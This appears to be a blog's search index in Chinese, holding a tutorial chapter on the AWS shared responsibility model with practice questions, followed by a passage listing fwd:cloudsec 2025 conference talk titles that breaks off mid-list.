<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>第 1 章 AWS 责任共担模型</title>
    <link href="/2025/08/17/%E7%AC%AC-1-%E7%AB%A0-AWS-%E8%B4%A3%E4%BB%BB%E5%85%B1%E6%8B%85%E6%A8%A1%E5%9E%8B/"/>
    <url>/2025/08/17/%E7%AC%AC-1-%E7%AB%A0-AWS-%E8%B4%A3%E4%BB%BB%E5%85%B1%E6%8B%85%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文，我们将探讨 AWS 责任共担模型，并进一步了解它们对 <strong>云平台本身的安全（Security Of Cloud）</strong> 和 <strong>云中托管的资源的安全（Security In Cloud）</strong> 的影响，主要内容如下：</p><ul><li>了解 AWS 中托管的资源的安全；</li><li>了解 AWS 责任共担模型；</li><li>了解不同的服务需要承担的或多或少的安全责任（从客户的角度来看）。</li></ul><p>在阅读本文之前，您需要对 AWS 服务以及 IaaS、PaaS 和 SaaS 云服务模型有基本的了解，以便了解不同模型之间的细微差别，并进一步了解云提供商和客户之间的安全责任转移。</p><blockquote><p>IaaS 指的是基础设施即服务，英文全称为 Infrastructure as a Service；</p><p>PaaS 指的是平台即服务，英文全称为 Platform as a Service；</p><p>SaaS 指的是软件即服务，英文全称为 Software as a Service；</p></blockquote><h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><h3 id="1-1-公有云市场的发展"><a href="#1-1-公有云市场的发展" class="headerlink" title="1.1 公有云市场的发展"></a>1.1 公有云市场的发展</h3><p>过去十年间，全国公有云市场增长超过十倍。2023 年，全球公有云市场规模约为 6700 亿美元，而到 2024 年，这一数字已增至 8000 亿美元。</p><p>在 AI 大模型快速发展的推动下，2024 年上半年全球公有云服务市场实现了 20% 的同比增长，并呈现加速增长的趋势。同时，AWS、微软和 Google 等全球领先的云服务提供商从 2024 年起也加快了发展步伐。</p><p><img src="/image/image_p0Kj4gMdQV.png" alt="图 1-1 全球公有云市场变化" title="图 1-1 全球公有云市场变化"></p><p>在公有云市场中，AWS 始终占据领先地位。2024 年第三季度，AWS 以 31% 的市场份额稳居全球首位。更多相关信息，请参阅<a href="https://www.emma.ms/blog/cloud-market-share-trends" title="《2025年值得关注的云市场份额趋势》">《2025 年值得关注的云市场份额趋势》</a>。</p><p><img src="/image/image_11HIDHc7qr.png" alt="图 1-2 2024 年第三季度全球主要云基础设施服务提供商的市场份额" title="图1-2 2024 年第三季度全球主要云基础设施服务提供商的市场份额"></p><p>同时，全球主权 AI 的发展以及中国、中东非和拉美等地区的数字化基建，都将推动公有云市场需求的增长。</p><iframe     src="//player.bilibili.com/player.html?isOutside=true&aid=114680794193447&bvid=BV1RxMyzQE5b&cid=30490955408&p=1"     scrolling="no"     border="0"     frameborder="no"     framespacing="0"     allowfullscreen="true"    width="100%"     height="500px"></iframe><p>Grand View 预测，全球公有云市场从 2024 年到 2030 年的年复合增长率预计为 17.0%。而 IDC 的预测显示，2024 年至 2028 年间，这一市场的年复合增长率将达到 19.4%，按照此增速，市场规模将在 2028 年实现翻倍。更多详情请参阅<a href="https://github.com/miao2sec/awesome-cloud-native-security/blob/main/%E6%BC%94%E7%A4%BA%E6%96%87%E7%A8%BF/%E6%B5%B7%E5%86%85%E5%A4%96%E4%BA%91%E5%8E%82%E5%95%86%E5%8F%91%E5%B1%95%E4%B8%8E%E7%8E%B0%E7%8A%B6%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AAI%E8%83%8C%E6%99%AF%E4%B8%8B%E8%B4%A2%E5%8A%A1%E6%95%B0%E6%8D%AE%E3%80%81%E4%BA%A7%E5%93%81%E5%B8%83%E5%B1%80%E4%B8%8E%E4%BC%B0%E5%80%BC%E5%8F%98%E5%8C%96.pdf" title=" 海内外云厂商发展与现状（一）：AI背景下财务数据、产品布局与估值变化.pdf">《海内外云厂商发展与现状（一）：AI 背景下财务数据、产品布局与估值变化》</a></p><h3 id="1-2-企业上云的安全性问题"><a href="#1-2-企业上云的安全性问题" class="headerlink" title="1.2 企业上云的安全性问题"></a>1.2 企业上云的安全性问题</h3><p>关于企业将资产迁移至公有云的文章、白皮书和案例研究层出不穷，高可用性、按需付费以及快速开发等概念也已被广泛讨论。然而，企业在上云过程中最具争议的话题依然是安全性问题。</p><p>2015 年，美国一家大型银行的首席信息官罗布·亚历山大（Rob Alexander）在<a href="https://www.youtube.com/watch?v=0E90-ExySb8" title="《AWS re:Invent 2015 主题演讲》">《AWS re:Invent 2015 主题演讲》</a>中提到：“在公有云上运行应用比在我们自己的数据中心更为安全。”由于银行业属于高度监管行业，这一观点具备较强的说服力。</p><p>Gartner 分析师 Lydia Leong 在其文章<a href="https://cloudpundit.com/2021/10/05/banks-are-accelerating-their-cloud-journeys/" title="《银行正在加速其云之旅》">《银行正在加速其云之旅》</a>中指出：“‘银行不会将核心业务迁移至云端’的说法正逐渐被打破。”</p><p>同时，也有企业在<a href="https://mp.weixin.qq.com/s/dRRYYa0PC0n5ckouGvMV9Q" title="《新视角下企业云化安全管控框架OCBC》">《新视角下企业云化安全管控框架 OCBC》</a>中表示：“已将银行核心系统全面部署在公有云上。”</p><p>然而，各大企业在 AWS 上发生的数据泄漏事件仍屡见不鲜。更多相关详情可参考公共仓库<a href="https://github.com/nagwww/s3-leaks" title="s3-leaks">s3-leaks</a>，其中汇总了 AWS S3 的数据泄漏案例。</p><table><thead><tr><th>日期</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>2025 年 4 月</td><td>从一个 S3 桶中获取了 AWS Access Key ID 的想法</td><td>AWS 王国的钥匙</td></tr><tr><td>2023 年 10 月</td><td>印度国家物流门户暴露了敏感个人数据和贸易记录</td><td>暴露了敏感的个人数据以及多项国家与私人贸易记录</td></tr><tr><td>2023 年 1 月</td><td>飞马航空（Pegasus Airlines）因 S3 桶配置错误泄露了 6.5TB 数据</td><td>航空公司泄露了 6.5TB 数据</td></tr><tr><td>2022 年 8 月</td><td>S3 桶配置错误导致暴露 3TB 敏感机场数据：“生命安全受到威胁”</td><td>这可真是很多数据都存放在 S3 上了</td></tr></tbody></table><p>那么，在公有云上运行应用是否真的安全？在探讨这一问题之前，我们需要聚焦于一个具体的公有云平台，以避免认知负担。以全球市场份额领先的公有云平台 AWS 为例：AWS 的安全性既不复杂也不简单，关键在于我们如何使用它。在责任共担模型下，安全是云服务提供商与用户双方的共同责任。</p><p>我们不会简单地回答“应用上云是否安全”这个问题，而是选择深入学习一个云平台，快速构建完整的知识框架与实操能力，再进一步实现知识迁移与融会贯通。</p><h2 id="0x02-通用的共担责任模型"><a href="#0x02-通用的共担责任模型" class="headerlink" title="0x02 通用的共担责任模型"></a>0x02 通用的共担责任模型</h2><p>学习云安全的第一步是明确云环境中各方所需承担的安全责任。存储在云中的数据和工作负载的安全性需要由 <strong>客户（Customer）</strong> 和 <strong>云服务提供商（Cloud Service Provider）</strong> 共同分担，但各自负责的范围有所不同。</p><p>通用的 <strong>责任共担模型（Shared Responsibility Model）</strong> 明确了双方的责任划分。该模型定义了作为客户的我们和作为云服务提供商的 AWS，在实施、控制和管理安全性时各自的职责范围。</p><p>需要注意的是，这一模型本身并不具备法律效力，但了解其内容并认识到其重要性，对于有效构建和保护云资源至关重要。</p><p><a href="https://aws.amazon.com/cn/blogs/industries/applying-the-aws-shared-responsibility-model-to-your-gxp-solution/" title="AWS 提供了三种不同的责任共担模型">AWS 提供了三种不同的责任共担模型</a>，分别适用于<strong>基础设施（Infrastructure）</strong> 、<strong>容器（Container）</strong> 和 <strong>托管（Managed）</strong> 服务。在这三种模型中，客户与云服务提供商分担的安全责任各不相同。</p><p>具体而言，客户和云服务提供商所需承担的安全责任取决于所使用或提供的服务类型。服务的可定制性越高，客户所需承担的安全责任就越大。换句话说，客户的安全责任与其在服务配置中需要执行的操作数量直接相关。</p><p>如图 1-3 所示，在以 IaaS 形式提供的基础设施服务（如 EC2）中，客户需承担更多的安全责任。这种更大的责任也带来了更高的灵活性和自定义能力。</p><p><img src="/image/image_U1T-MMMjnL.png" alt="图 1-3：共担责任模型比较" title="图 1-3：共担责任模型比较"></p><p>图 1-3 总结了基础设施服务、容器服务和托管服务三种模型中，客户与 AWS 各自需要承担的安全责任。</p><p>在这三种模型中，AWS 始终需要承担以下安全责任：<strong>硬件</strong>、<strong>AWS 全球基础设施</strong>以及<strong>AWS 基础服务</strong>。</p><ul><li><strong>硬件（Hardware）</strong>：指构成云服务的物理设备，包括物理服务器、网络设备、磁盘阵列、机架、电源及制冷系统等。作为云计算资源的底层基础，这些硬件由 AWS 负责采购与维护。</li><li><strong>AWS 全球基础设施（AWS Global Infrastructure）</strong>：指 AWS 在全球范围内的物理与逻辑资源布局架构，涵盖<strong>区域（Region）</strong>、<strong>可用区（Availability Zone）<strong>及</strong>边缘位置（Edge Location）</strong>。它构成了 AWS 用于存储资源和提供接入点的数据中心网络，包含大量物理硬件资源。需要注意的是，AWS 全球基础设施不仅涉及硬件，还强调地理分布与架构设计。</li><li><strong>AWS 基础服务（AWS Foundation Services）</strong>：包括<strong>计算（Compute）</strong>、<strong>存储（Storage）</strong>、<strong>数据库（Database）<strong>和</strong>网络（Network）</strong>。这些服务是 AWS 上运行应用或部署架构的技术基石，依赖于 AWS 的硬件与全球基础设施，为用户提供按需创建和管理资源的能力。与全球基础设施侧重地理分布不同，AWS 基础服务更关注在这些基础设施上运行的核心资源服务能力，并为其他 AWS 服务（如 AI、大数据及安全工具等）提供支持。</li></ul><p>作为客户，我们无法物理访问 AWS 数据中心并查看其运行的云资源，也无法直接访问 AWS 的物理主机及其底层虚拟机管理程序软件。</p><p>作为云服务提供商，AWS 有责任确保其数据中心符合严格的安全控制和全球安全标准，同时保障物理主机上的资源隔离性，确保所有访问均处于受控状态。</p><h2 id="0x03-基础设施服务"><a href="#0x03-基础设施服务" class="headerlink" title="0x03 基础设施服务"></a>0x03 基础设施服务</h2><h3 id="3-1-责任共担模型"><a href="#3-1-责任共担模型" class="headerlink" title="3.1 责任共担模型"></a>3.1 责任共担模型</h3><p>AWS 通过其遍布全球的数据中心，提供底层硬件和基础设施，使客户能够利用池化的硬件资源创建云资源。本质上，客户在全球基础设施中使用 AWS 基础服务时，需对其所有操作承担最终的安全责任。</p><p>如图 1-4 所示，基础设施服务的责任共担模型是最为人们熟知的模型，主要涵盖诸如 <strong>亚马逊弹性计算云（Amazon Elastic Compute Cloud，简称 EC2）</strong> 等 IaaS 服务。</p><p><img src="/image/image_6Mfh0aB2uv.png" alt="图 1-4：基础设施服务责任共担模型" title="图1-4：基础设施服务责任共担模型"></p><p>EC2，也就是大家常说的 AWS 虚拟机。以 EC2 为例，客户需要承担的安全责任包括以下方面：</p><ul><li><strong>客户数据（Customer Data）</strong>：客户需对在 AWS 环境中导入或创建的数据安全负责，例如存储在 EC2 卷中的所有数据，无论是临时数据还是持久化数据。</li><li><strong>平台、应用及身份与访问管理（Platform, Application, and IAM）</strong>：当客户在 EC2 实例上部署应用或平台时，需自行配置相关控制措施，并对 EC2 实例及其应用的访问控制负全责。AWS 提供了 <strong>身份与访问管理（Identity and Access Management，简称 IAM）</strong> 服务来支持这些控制措施，但其是否被有效使用以确保安全性，则完全取决于客户自身。</li><li><strong>操作系统、网络及防火墙配置（Operating System, Network and Firewall Configuration）</strong>：如图 1-2 所示，AWS 的责任范围仅到<strong>软件（Software）</strong>，一般指的是 <strong>虚拟化管理程序（Hypervisor）</strong> 为止。由于 EC2 实例属于基础设施服务，维护操作系统的安全性是客户的责任，包括操作系统的补丁更新和修复。此外，EC2 实例通常部署在 <strong>虚拟私有云（Virtual Private Cloud，简称 VPC）</strong> 中，因此客户需要自行配置并关联网络设置和防火墙规则（如安全组），以保障 EC2 实例群的安全。需要注意的是，安全组实际上是一种作用于实例级别的虚拟防火墙。</li><li><strong>客户端数据加密与数据完整性认证（Client-Side Data Encryption and Data Integrity Authentication）</strong>：本部分重点介绍如何通过加密机制保护由 EC2 实例生成或存储的数据。若需对数据进行加密，客户需自行部署相关机制以实现保护目标。 &#x20;</li><li><strong>服务端加密（Server-Side Encryption）</strong>：若客户希望通过服务端加密来保护<strong>文件系统（Filesystem）<strong>和</strong>数据（Data）</strong>，则需利用 <strong>密钥管理服务（Key Management Service，简称 KMS）</strong> 等工具来完成数据保护的实施。</li><li><strong>网络流量保护（Network Traffic Protection）</strong>：在 EC2 实例之间传输网络流量时，客户应在适当场景下配置 SSL 或 HTTPS 等协议以加密通信。通过 <strong>AWS 证书管理（AWS Certificate Manager）</strong> 服务，可简化 AWS 服务中安全证书的管理与配置，从而确保通信过程中的 <strong>加密（Encryption）</strong> 、 <strong>身份验证（Authentication）<strong>和</strong> 完整性校验（Integrity）</strong> 。更多详细内容将在《第 19 章 证书与证书服务》中深入探讨。</li></ul><p>在这里需要补充加密责任模型中服务端与客户端的区别：</p><ul><li><strong>客户端加密（Client-Side Encryption）</strong>：用户通过 OpenSSL、AWS SDK 等工具，在本地对数据进行加密后，再上传至 S3 或 WBS 等 AWS 服务。加密逻辑和密钥完全由用户掌控，AWS 仅负责存储加密后的数据，无法获知具体内容。</li><li><strong>服务端加密（Server-Side Encryption）</strong>：用户上传未加密的明文数据，AWS 在接收后于服务端自动完成加密操作。加密过程可使用默认密钥，或由用户通过 KMS 管理的密钥执行。加密动作由 AWS 负责实施，但服务的启用与配置仍需用户自行完成。</li></ul><h3 id="3-2-示例"><a href="#3-2-示例" class="headerlink" title="3.2 示例"></a>3.2 示例</h3><p>若要自行创建虚拟机，我们需要订购物理服务器、机架和堆叠硬件，并将其安装到数据中心的机柜中以确保安全。</p><p>然而，在 AWS 账号中创建 EC2 实例时，只需从 AWS 提供的地理区域中选择一个区域来部署实例即可。</p><p>创建 EC2 实例后，需配置 VPC 以实现基本的网络连接。</p><p>一旦 EC2 实例开始运行，无论是运行几分钟、几小时、几个月还是几年，作为客户，我们都需要负责更新或移除不符合安全基线的软件包。</p><p>如果添加其他用户，则会涉及身份与访问管理（IAM）的问题。我们必须确保这些用户遵循组织的密码或密钥策略。</p><p>如果我们安装了其他应用，并且厂商或开发者提供了安全补丁，也需要及时更新。</p><p>当需要连接该 EC2 实例时，创建通过 SSL 或 TLS 实现的安全连接同样是我们的责任。确保数据在网络传输过程中的安全性，也属于责任共担模型中客户应承担的安全职责。</p><h3 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h3><p>总的来说，使用 IaaS 时，AWS 负责保障云平台自身的安全，包括虚拟化管理程序及其下层的安全。同时，AWS 还需确保云中托管资源的安全，这一责任从操作系统层向上延伸，涵盖配置、应用以及数据等方面。</p><p>尽管基础设施服务在云计算领域占据重要地位，尤其是在 AWS 平台上表现突出，但它与 PaaS 或 SaaS 等打包式服务在安全责任划分上存在显著差异。</p><h2 id="0x04-容器服务"><a href="#0x04-容器服务" class="headerlink" title="0x04 容器服务"></a>0x04 容器服务</h2><h3 id="4-1-责任共担模型"><a href="#4-1-责任共担模型" class="headerlink" title="4.1 责任共担模型"></a>4.1 责任共担模型</h3><p>本文将介绍的第二个责任共担模型是容器服务的责任共担模型。</p><p>如果你对云原生安全有所了解，那么对“容器”这个词一定不陌生。容器是一种能够将应用及其依赖打包的技术，常见的实现工具有 Docker、Podman 和 Containerd。AWS 也提供了弹性容器服务，即 Amazon ECS，我们将在《第 2 章 基本 AWS 服务》中介绍。</p><p>然而，在这里，“容器服务”主要指运行在基础设施服务之上的服务。如果客户选择使用容器服务，则无法访问某些基础设施级别的组件（如操作系统）。以下是一些常见的容器服务及平台即服务（PaaS）示例：</p><ul><li><strong>AWS 弹性大数据处理服务（AWS Elastic MapReduce，简称 EMR）</strong>：支持 Apache Hadoop 和 Spark 等大数据框架的服务。</li><li><strong>AWS 关系型数据库服务（AWS Relational Database Service，简称 RDS）</strong>：提供 MySQL、PostgreSQL 和 Oracle 等数据库服务。</li><li><strong>AWS 弹性应用部署平台（AWS Elastic Beanstalk，简称 EB）</strong>：一个用于快速部署和管理 Web 应用的 PaaS 平台，支持 Node.js、Python 和 Java 等多种编程语言。</li></ul><p><img src="/image/image_wcRIDjO-NX.png" alt="图 1-5：容器服务责任共担模型" title="图 1-5：容器服务责任共担模型 "></p><p>如图 1-5 所示，在容器服务的责任共担模型中，AWS 仍然承担基础设施服务的安全责任，同时新增了以下安全职责：</p><ul><li>操作系统、网络及防火墙配置</li><li>平台、应用、身份与访问管理</li><li>服务端加密</li><li>网络流量保护</li></ul><h3 id="4-2-示例"><a href="#4-2-示例" class="headerlink" title="4.2 示例"></a>4.2 示例</h3><p>以常见的容器服务——RDS 为例。在 PaaS 模式下，客户无法访问 RDS 运行的底层操作系统，因而无法自行修复操作系统中的安全漏洞，这一安全责任已转移至 AWS。平台和应用的管理责任也由 AWS 承担。这意味着所有与应用维护相关的安全责任均由 AWS 负责。</p><h3 id="4-3-总结"><a href="#4-3-总结" class="headerlink" title="4.3 总结"></a>4.3 总结</h3><p>相较于基础设施服务，容器服务虽然减轻了客户的管理负担，但也带来了一定的限制，客户只能访问平台及其堆栈以上的内容。</p><h2 id="0x05-抽象服务"><a href="#0x05-抽象服务" class="headerlink" title="0x05 抽象服务"></a>0x05 抽象服务</h2><h3 id="5-1-责任共担模型"><a href="#5-1-责任共担模型" class="headerlink" title="5.1 责任共担模型"></a>5.1 责任共担模型</h3><p>接下来，我们来学习责任共担模型的最后一种形式——抽象服务的责任共担模型。以下是一些常见的抽象服务：</p><ul><li><strong>亚马逊简单队列服务（Amazon Simple Queue Service，简称 SQS）</strong>：一种高度可扩展的消息队列服务，用于解耦和协调分布式系统中的组件，支持异步消息传递和事件驱动架构。</li><li><strong>亚马逊 DynamoDB</strong>：一项托管的 NoSQL 数据库服务，具备毫秒级延迟和自动扩展能力，适用于高吞吐量的键值和文档数据处理。</li><li><strong>亚马逊简单存储服务（Amazon Simple Storage Service，简称 S3）</strong>：一种对象存储服务，支持以高可用性和高持久性的方式在互联网上存储和检索任意规模的数据，例如图片、日志文件和备份等。</li></ul><p>如图 1-6 所示，与基础设施服务相比，在抽象服务模型中，许多安全相关的任务已转移至 AWS 负责的范畴。</p><p><img src="/image/image_VDHL7WN59r.png" alt="图 1-6：抽象服务的责任共担模型" title="图 1-6：抽象服务的责任共担模型"></p><p>与容器服务相比，该模型中的“服务端加密”和“网络流量保护”责任转移到了客户身上。以 S3 为例，我们具体说明如下：</p><ul><li><strong>服务端加密</strong>：AWS 提供 SSE-S3 技术来管理加密密钥并执行加密操作，但客户需决定是否启用、选择加密类型，并确保上传数据时正确配置相关参数。</li><li><strong>网络流量保护</strong>：AWS 负责保障 S3 内部复制时的传输安全，而客户则需确保已启用 S3 的 HTTPS 连接，并正确配置网络策略。</li></ul><p>此时，你可能会产生疑问：为何 AWS 负责实施“服务端加密”并管理服务组件之间的“网络流量保护”，但这两项却成为客户的安全责任？</p><p>原因在于，在抽象服务中，AWS 负责技术实现，而客户负责是否启用以及如何配置。抽象服务之所以被称为“抽象”，是因为其底层实现被隐藏，客户无需深入了解底层细节，但仍需承担正确配置的安全责任。简而言之，客户无法直接控制抽象服务的底层，只能通过 API 端点进行配置，因此安全配置的责任实际上“抽象”给了客户。</p><p>如果将抽象服务比作自助餐厅，那么抽象服务提供的技术能力就像餐厅提供的保温设备和食品安全设施。在自助餐厅中，顾客需要自行判断食物的新鲜度、选择菜品、搭配饮食，并挑选座位；类似地，在抽象服务中，客户需要验证数据的完整性、确认是否加密、选择加密方式，并配置网络防护措施。</p><p>相比之下，容器服务更像是点餐服务——有服务员协助检查食品质量、推荐搭配方案，并安排合适的座位。在容器服务中，AWS 会帮助管理网络保护、配置加密选项，并优化安全设置。</p><h3 id="5-2-示例"><a href="#5-2-示例" class="headerlink" title="5.2 示例"></a>5.2 示例</h3><p>一般情况下，我们会将静态文档和数据存储在多个 S3 存储桶中，因为 S3 不仅是 Blob 存储的理想选择，还具备高性价比。</p><p>AWS 负责管理 S3 平台，并确保操作系统和应用程序的补丁及时更新。</p><p>当决定将某个文档存入特定存储桶时，我们需要根据组织策略确认是否需要进行静态加密。如果需要加密，则要进一步选择使用客户端加密还是服务端加密。</p><ul><li><strong>客户端加密</strong>：生成密钥对文档进行加密，然后将加密后的文件上传至 S3 存储桶。 &#x20;</li><li><strong>服务端加密</strong>：可以选择通过 AWS 密钥管理服务（KMS）提供自定义的客户主密钥（CMK），或者使用 Amazon 自动管理的密钥，在对象写入存储桶时自动完成加密。</li></ul><p>数据上传到存储桶后，存储桶管理员还需确定访问权限及控制方式。</p><ul><li>如果仅限内部用户访问，则需创建 IAM 策略； &#x20;</li><li>如果需要为其他组织的用户提供访问权限，则需制定具有适当权限的存储桶策略。</li></ul><h3 id="5-3-总结"><a href="#5-3-总结" class="headerlink" title="5.3 总结"></a>5.3 总结</h3><p>在抽象服务的责任共担模型中，客户负责承担自己的数据、访问权限以及加密配置。</p><h2 id="0x06-审计工作"><a href="#0x06-审计工作" class="headerlink" title="0x06 审计工作"></a>0x06 审计工作</h2><p>了解了以上三种责任共担模型后，我们接下来学习如何理解并运用这些模型来辅助审计工作。</p><p>在各行各业中，组织通常需要我们在云环境中处理合规性相关任务。通过上述学习内容，我们已经明确了客户所需承担的安全责任以及云服务提供商应负责的安全责任。</p><p>当审计员需要了解某项由 AWS 负责的内容时，您可以参考相应的共享责任模型，以此证明 AWS 对该部分标准的管理责任及控制措施。</p><p>最后需要强调的是，深入理解每一种责任划分模型，有助于我们制定更加完善的安全策略，从而提升整个 AWS 账户的安全防护能力。清晰掌握客户与 AWS 各自承担的安全责任，是规避潜在风险的重要前提。</p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>本文介绍了 AWS 服务中使用的三种责任共担模型，分别涉及基础设施、容器和抽象服务。从安全角度来看，我们作为客户与 AWS 作为云服务提供商所承担的安全责任会因所使用或提供的服务类型而有所不同。</p><p>理解并区分这些模型，对于制定解决方案的安全策略至关重要。通过明确我们作为客户的安全责任边界，以及 AWS 的责任起点，可以更好地确保我们的账户在 AWS 基础设施中不会存在漏洞。</p><p>此外，掌握安全责任共担模型还有助于我们在业务合规性和审计方面明确各自的职责范围。更多详细信息，请参考以下资料：</p><ul><li>AWS 安全性简介：<a href="https://d1.awsstatic.com/whitepapers/Security/Intro_to_AWS_Security.pdf" title="《Introduction to AWS Security》">《Introduction to AWS Security》</a> &#x20;</li><li>AWS 责任共担模型的官方说明：<a href="https://aws.amazon.com/cn/compliance/shared-responsibility-model/" title="《责任共担模型》">《责任共担模型》</a> &#x20;</li><li>upwind 关于 AWS 责任共担模型的文章：<a href="https://www.upwind.io/glossary/aws-shared-responsibility-model" title="《AWS Shared Responsibility Model》">《AWS Shared Responsibility Model》</a> &#x20;</li><li>Alert Logic 关于 AWS 责任共担模型的博客：<a href="https://www.alertlogic.com/blog/the-aws-shared-responsibility-model-explained/" title="《The AWS Shared Responsibility Model Explained》">《The AWS Shared Responsibility Model Explained》</a> &#x20;</li></ul><p>接下来，我们将在《第 2 章 基本 AWS 服务》学习一些基础的 AWS 服务，并简要概述 AWS 生态系统中常用但并非以安全性为核心的服务。即便这些服务并非专注于安全功能，但它们在为客户和系统构建解决方案时仍然扮演着重要角色。AWS 安全能力认证要求您具备这些服务的基本知识，并了解如何以安全工程师或专业人士的身份对其进行强化配置。</p><h2 id="0x08-练习题"><a href="#0x08-练习题" class="headerlink" title="0x08 练习题"></a>0x08 练习题</h2><ol><li><p>【单选题】作为 AWS 客户，以下哪些安全任务是您的安全责任？</p><p>A. 安全组配置</p><p>B. IAM 管理</p><p>C. 数据加密和安全</p><p>D. 上述所有的</p></li><li><p>【单选题】作为 AWS 客户，您有责任在任何和所有共享责任模型中保持应用程序的更新和修补。</p><p>A. 正确</p><p>B. 错误</p></li><li><p>【单选题】AWS 所承担的安全责任是什么？</p><p>A. 云中托管的资源的安全（Security in Cloud）</p><p>B. 云平台本身的安全（Security of Cloud）</p><p>C. CIS 基准和标准</p><p>D. 安全责任共担模型</p></li><li><p>【单选题】负责保护存储在物理磁盘上的客户数据的实体是：</p><p>A. AWS</p><p>B. 客户（用户）</p><p>C. 审计用户</p><p>D. 终端用户</p></li><li><p>【单选题】您有一个已运行数月的 EC2 实例。您在一条安全公告中看到，该 EC2 实例所运行的开源操作系统需要一个关键补丁。该如何解决这个问题？</p><p>A. 您不必担心这个问题，因为 AWS 负责监督全球基础设施并会为您处理好这个问题。</p><p>B. 您创建实例的 AMI，然后启动它的新版本，因为所有 EC2 实例都在 AWS 初始化时进行了修补。</p><p>C. 作为操作安全实践的一部分，手动或通过自动化流程修补 EC2 实例。</p><p>D. 联系操作系统供应商，以便他们可以为您的所有系统执行补丁更新。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>AWS 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fwd:cloudsec 2025：会议演讲总结</title>
    <link href="/2025/08/01/fwd-cloudsec-2025%EF%BC%9A%E4%BC%9A%E8%AE%AE%E6%BC%94%E8%AE%B2%E6%80%BB%E7%BB%93/"/>
    <url>/2025/08/01/fwd-cloudsec-2025%EF%BC%9A%E4%BC%9A%E8%AE%AE%E6%BC%94%E8%AE%B2%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>每年全球有成百上千场安全会议，但真正专注云安全实战的，却屈指可数。而<a href="https://fwdcloudsec.org/conference/north-america/" title="fwd:cloudsec">fwd:cloudsec</a>，就是其中少有的、由社区主导、内容高度聚焦的高质量会议。</p><p>今年的 fwd:cloudsec 2025 于 6 月 30 日至 7 月 1 日在美国丹佛举行，来自 AWS、Google、WIZ、CrowdStrike、Datadog 等一线厂牌的攻防专家们齐聚一堂，分享最新研究与实战经验。</p><p><img src="/image/693.webp" alt="图 1：赞助商"></p><p>fwd:cloudsec 是一个专注于云安全领域的非营利性会议，由 Forward CloudSec Association 组织举办，旨在为真实的云安全从业者提供一个独立、实践导向的平台。</p><p>若您无法参加会议，也不用担心。Cybr 已经整理了<strong>43 场会议演讲的详细摘要</strong>，内容包括：</p><ul><li>快速理解的高层概览；</li><li>关键要点和可执行见解；</li><li>技术实现细节及具体示例；</li><li>用于深入学习的完整演讲记录；</li><li>原始 YouTube 演讲的直接链接。</li></ul><p><img src="/image/694.webp" alt="图 2：会议材料"></p><blockquote><p>点击<a href="https://github.com/Cybr-Inc/fwdcloudsec-2025-summaries">会议材料</a>，直接获取资料。</p></blockquote><h2 id="0x01-演讲内容概览"><a href="#0x01-演讲内容概览" class="headerlink" title="0x01 演讲内容概览"></a>0x01 演讲内容概览</h2><h3 id="类别一：AI-ML-安全"><a href="#类别一：AI-ML-安全" class="headerlink" title="类别一：AI&#x2F;ML 安全"></a>类别一：AI&#x2F;ML 安全</h3><p>AI 与安全的交叉成为热门话题，共有 7 场演讲：</p><ol><li>攻破 AI Agents：利用预设提示模板接管 Amazon Bedrock Agents</li><li>通过提示格式绕过 AI 安全控制</li><li>“AI 即服务”中的日志记录挑战</li><li>双面间谍：揭露 AI Agent 平台中的隐藏威胁</li><li>和误报说再见：构建值得信赖的 IaC 分析 AI</li><li>微软如何应对云驱动的深度伪造威胁</li><li>驯服 LLM，用于检测云审计日志中的异常</li></ol><h3 id="类别二：身份与访问管理-IAM"><a href="#类别二：身份与访问管理-IAM" class="headerlink" title="类别二：身份与访问管理 IAM"></a>类别二：身份与访问管理 IAM</h3><p>IAM 仍然是云安全中最棘手的问题，这一主题的演讲数量最多，共有 15 场演讲：</p><ol><li>ECS-cape：劫持 Amazon ECS 中的 IAM 权限</li><li>快乐小云：用微软云和身份数据“画画”</li><li>I SPy：重新思考 Entra ID 的研究，发掘获取全局管理员的新路径</li><li>IAM Roles Anywhere + Let’s Encrypt：让人人都能用</li><li>无 IP 也能搞事：绕过 IAP 进行数据外泄</li><li>不那么秘密：GitHub Actions Secrets 的隐藏风险</li><li>Workload Identity 实践：将 SPIFFE 用在生产环境</li><li>为现代 Entra 环境重构 ROADRecon</li><li>保护远程 MCP 服务器</li><li>在 Office 365 中保持隐秘</li><li>AWS IAM 的双面性</li><li>虚假的安全感：防御如何变成漏洞</li><li>信任问题：这些 JSON 文件到底代表什么？</li><li>如果能用水晶球预测 IAM 会问什么？</li><li>当你的云伙伴背叛你：云中信任关系被攻破</li></ol><h3 id="类别三：威胁狩猎与检测"><a href="#类别三：威胁狩猎与检测" class="headerlink" title="类别三：威胁狩猎与检测"></a>类别三：威胁狩猎与检测</h3><p>专注于识别与发现威胁，共有 3 场演讲：</p><ol><li>发现不可见：设备环境中的威胁狩猎</li><li>猎人心法：一年云端威胁狩猎经验总结</li><li>“资源未找到”？搞懂 GCP 错误码用于应急响应和检测</li></ol><h3 id="类别四：攻击技术与漏洞"><a href="#类别四：攻击技术与漏洞" class="headerlink" title="类别四：攻击技术与漏洞"></a>类别四：攻击技术与漏洞</h3><p>理解攻击者的视角，共有 3 场演讲：</p><ol><li>防守者讨厌这招：用一个“怪招”搞定易受攻击的 SaaS 应用</li><li>一次打三家 CSP：一个漏洞带来的好、坏与丑</li><li>whoAMI：发现并利用 AMI 名称混淆大规模攻击</li></ol><h3 id="类别五：云架构与基础设施"><a href="#类别五：云架构与基础设施" class="headerlink" title="类别五：云架构与基础设施"></a>类别五：云架构与基础设施</h3><p>实战指南与架构经验，共有 13 场演讲：</p><ol><li>超越三巨头：掌握 Oracle Cloud 在多云环境下的安全实践</li><li>大型 AWS 